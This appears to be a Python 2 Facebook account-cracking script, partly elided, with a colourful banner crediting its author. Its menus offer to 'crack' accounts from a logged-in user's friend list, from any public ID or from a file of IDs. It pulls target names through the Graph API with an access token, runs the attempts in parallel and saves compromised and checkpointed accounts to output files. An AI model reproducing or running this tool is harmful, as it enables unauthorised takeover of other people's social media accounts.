...
print "\033[1;96m ============================================================="
print  """\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mTech Qaiser
\033[1;96mInstagram \033[1;93m: \033[1;92mQaiserAbbas
\033[1;96mFacebook  \033[1;93m: \033[1;92m QaiserAbbas
\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/TechQaiser
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="
           
CorrectUsername = "Qaiser"
CorrectPassword = "Borne"
...
def login():
	...
	try:
		...
		print logo
		print 42*"\033[1;96m=" 
		print('\033[1;96m[°•]Login With Facebook \x1b[1;96m[☆]' )
		id = raw_input('\033[1;91m[-] Id/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;92m[**] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;92m[!] \x1b[1;91mThere is no internet connection "
			keluar()
		...
		if 'save-device' in url:
			try:
				...
				unikers.close()
				print '\n\033[1;91m[✓] \x1b[1;92mLogin Successfull'
		...
		if 'checkpoint' in url:
			...
			print("\n\033[1;96m[!] \x1b[1;95mPassword/Email is wrong try again")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
...
def menu():
	...
	try:
		...
		os.system('clear')
		print"\033[1;95m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		...
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mIt looks like that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;95m[!] \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;92m[\033[1;97m✓™\033[1;95m]\033[1;91m Name \033[1;91m: \033[1;92m"+nama+"\033[1;92m               "
	print "\033[1;92m[\033[1;97m✓™\033[1;95m]\033[1;91m ID   \033[1;95m: \033[1;91m"+id+"\x1b[1;96m              "
	print 42*"\033[1;92m="
	print "\x1b[1;92m[\x1b[1;92m1\x1b[1;95m]\x1b[1;91m Start Hacking with qaiser"
	print "\x1b[1;92m[\x1b[1;91m0\x1b[1;95m]\x1b[1;93m Exit            "
	pilih()
...
def pilih():
	unikers = raw_input("\n\033[1;95m >>> \033[1;95m")
	if unikers =="":
		print "\033[1;95m[!] \x1b[1;95mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
...
def super():
	...
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;93m Crack From Friend List"
	print "\x1b[1;93m Crack From Any Public ID"
	print "\x1b[1;93m Crack From File"
	print "\x1b[1;92mBack"
	pilih_super()
...
def pilih_super():
	...
	if peak =="":
		...
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;94mGetting ID \033[1;97m...')
		...
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("+\033[1;94mEnter ID : \033[1;91m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;95mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;97mBack\033[1;96m]")
			super()
	...
	jalan('\033[1;93mStarting Wait a while ☕🍵\033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;93mTo Stop Process Press CTRL Then Press z')
	print 42*"\033[1;96m="
	...
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;95mProcess Has Been Completed \033[1;97m....'
	print"\033[1;94mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;93mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	print"""
──▄▀▀▀▄───────────────
──█───█───────────────
─███████─────────▄▀▀▄─
